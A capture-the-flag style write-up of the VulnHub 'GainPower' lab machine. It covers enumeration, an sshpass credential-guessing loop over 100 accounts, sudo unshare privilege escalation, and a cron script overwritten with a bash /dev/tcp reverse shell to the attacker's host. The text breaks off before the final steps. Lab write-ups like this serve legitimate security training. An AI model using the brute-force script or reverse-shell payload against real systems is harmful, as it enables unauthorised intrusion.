---
title: Vulnhub - GainPower
description: My writeup on GainPower box.
categories:
 - vulnhub
tags: vulnhub
---

![](https://static.vecteezy.com/system/resources/previews/000/602/897/non_2x/creative-power-logo-concept-design-templates-vector.jpg)

Hi all, i have to admit that this box took me a while to pwn it. I got stuck HARD with the privesc but at the end was really easy but i got confused anyway let's pwn it. :)

You can find the machine there > [GainPower](https://www.vulnhub.com/entry/gainpower-1,493/){:target="_blank"}

## Enumeration/Reconnaissance

Let's start always with nmap.

```
$ ip=192.168.1.2                       
$ nmap -sC -sV -p- -oN nmap/initial $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-02 00:42 EEST
Nmap scan report for 192.168.1.2 (192.168.1.2)
Host is up (0.00096s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 88:41:61:11:e1:1f:18:7d:d6:0c:38:29:25:79:16:2c (RSA)
|   256 18:c5:fd:ce:cd:2b:92:f8:d9:17:17:21:24:9d:67:df (ECDSA)
|_  256 84:c5:14:e4:e9:33:21:41:6a:92:72:b9:a7:33:1a:ea (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS)
|_http-title: Watch shop | eCommers
8000/tcp open  http    Ajenti http control panel
|_http-title: Ajenti
MAC Address: 00:0C:29:5E:CF:3F (VMware)
```

This box requires banner grabbing, i usually forget/avoid to do that but this box needs it.

`banner grabbing` -> banner grabbing is a enumeration technique that retrieves a banner information, banner usually contains important information about a service, like software name and version.

```
$ ssh $ip
Hi !!! THIS MESSAGE IS ONLY VISIBLE IN OUR NETWORK :) 

   ___      _        ___                    
  / __|__ _(_)_ _   | _ \_____ __ _____ _ _ 
 | (_ / _` | | ' \  |  _/ _ \ V  V / -_) '_|
  \___\__,_|_|_||_| |_| \___/\_/\_/\___|_|  
                                            

I HOPE EVERYONE KNOW THE JOINING ID CAUSE THAT IS YOUR USERNAME : ie : employee1 employee2 ... ... ... so on ;)

I already told the format of password of everyone in the yesterday's metting.

Now i have configured everything. My request is to everyone to Complete assignments on time 

btw one of my employee have sudo powers because he is my favourite 

NOTE : "This message will automatically removed after 2 days" 
								- BOSS
```

Here we go, if we try `employee1:employee1` we're in.

```
ssh employee1@$ip
employee1@192.168.1.2's password: 
[employee1@192 ~]$ 
```

Now the banner says something : `btw one of my employee have sudo powers because he is my favourite`, there are lot of employee :

```
[employee1@192 ~]$ cat /etc/passwd | grep employee...
employee1:x:1000:1000::/home/employee1:/bin/bash
employee2:x:1001:1001::/home/employee2:/bin/bash
employee3:x:1002:1002::/home/employee3:/bin/bash
.. data ..
employee98:x:1097:1097::/home/employee98:/bin/bash
employee99:x:1098:1098::/home/employee99:/bin/bash
employee100:x:1099:1099::/home/employee100:/bin/bash
```

I coded a simple bash script to do this job! :)

```bash
#!/bin/bash
#by: âtøm

pwn () {
  read -p 'target ip: ' ip
  sleep 2
  for data in {1..100}
  do
      echo 'Try: ' $data
      sshpass -p 'employee'$data ssh employee$data@$ip 'echo employee'$data' | sudo -S -l'
      printf "\n"
  done
}

pwn
```

Takes some time.. after some minutes i found the right employee! :D

```
Try:  64
Hi !!! THIS MESSAGE IS ONLY VISIBLE IN OUR NETWORK :) 

   ___      _        ___                    
  / __|__ _(_)_ _   | _ \_____ __ _____ _ _ 
 | (_ / _` | | ' \  |  _/ _ \ V  V / -_) '_|
  \___\__,_|_|_||_| |_| \___/\_/\_/\___|_|  
                                            

I HOPE EVERYONE KNOW THE JOINING ID CAUSE THAT IS YOUR USERNAME : ie : employee1 employee2 ... ... ... so on ;)

I already told the format of password of everyone in the yesterday's metting.

Now i have configured everything. My request is to everyone to Complete assignments on time 

btw one of my employee have sudo powers because he is my favourite 

NOTE : "This message will automatically removed after 2 days" 
								- BOSS
 
[sudo] password for employee64: Matching Defaults entries for employee64 on 192:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User employee64 may run the following commands on 192:
    (programmer) /usr/bin/unshare
```

Let's test it out!

```
[employee1@192 ~]$ su - employee64
Password: 
[employee64@192 ~]$ sudo -u programmer /usr/bin/unshare
[sudo] password for employee64: 
-bash-4.2$ whoami
programmer
```

Bingo now for the next privesc we need [pspy](https://github.com/DominicBreuker/pspy){:target="_blank"} to deleted the cronjob!

```
-bash-4.2$ wget -q 192.168.1.16/pspy64; chmod +x pspy64
-bash-4.2$ ./pspy64 -pf -i 1000
...
2020/07/01 18:13:02 CMD: UID=1183 PID=12429  | /bin/bash /media/programmer/scripts/backup.sh
```

This file run as `UID=1183` -> 

```
-bash-4.2$ cat /etc/passwd | grep 1183
vanshal:x:1183:1184::/home/vanshal:/bin/bash
```

Let's add our payload in & grab a shell as vanshal.

```
-bash-4.2$ > backup.sh 
-bash-4.2$ cat - > backup.sh 
bash -i >& /dev/tcp/192.168.1.16/5555 0>&1
^C
```

```
$ nc -lvp 5555
listening on [any] 5555 ...
[vanshal@192 ~]$ whoami
vanshal
```

Great, now we can see this file in his desktop :

```
[vanshal@192 ~]$ ls -la
ls -la
total 32
drwx------.   2 vanshal prome   97 Jun 21 11:43 .
drwxr-xr-x. 185 root    root  8192 Aug  7  2019 ..
-rw-r--r--.   1 vanshal prome   18 Oct 30  2018 .bash_logout
-rw-r--r--.   1 vanshal prome  193 Oct 30  2018 .bash_profile
-rw-r--r--.   1 vanshal prome  231 Oct 30  2018 .bashrc
-rw-r--r--.   1 vanshal prome 1550 May 18 06:47 local.txt
-rw-r--r--.   1 root    root   439 Aug  8  2019 secret.zip
```

Let's move it in our system.


